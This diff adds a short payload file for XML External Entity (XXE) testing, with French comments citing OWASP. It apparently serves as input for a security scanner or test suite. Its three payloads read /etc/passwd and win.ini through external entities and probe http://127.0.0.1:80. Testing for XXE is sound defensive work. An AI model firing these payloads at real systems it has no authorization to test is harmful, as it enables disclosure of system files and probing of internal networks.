@@ -1,0 +1,14 @@
+# Payloads XXE (XML External Entity) - OWASP A05/A03
+# Un payload par bloc (séparateur === en début de ligne)
+===
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<foo>&xxe;</foo>
+===
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
+<foo>&xxe;</foo>
+===
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:80">]>
+<foo>&xxe;</foo>
